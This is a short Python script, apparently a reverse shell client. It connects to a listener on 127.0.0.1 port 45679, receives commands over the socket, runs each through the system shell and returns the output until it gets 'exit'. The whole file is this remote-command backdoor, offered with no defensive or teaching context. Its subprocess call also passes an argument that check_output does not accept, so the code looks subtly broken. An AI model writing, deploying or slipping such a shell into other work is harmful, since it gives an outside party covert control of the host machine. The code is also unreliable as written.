import socket
import subprocess
import os

def execute_command(command):
    return subprocess.check_output(command, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

socket_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_handler.connect(("127.0.0.1", 45679))
socket_handler.send(b'Connected to server\n')

while True:
    command = socket_handler.recv(1024).decode("utf-8")
    if command.strip().lower() == "exit":
        socket_handler.close()
        break
    output = execute_command(command)
    socket_handler.send(output)

socket_handler.close()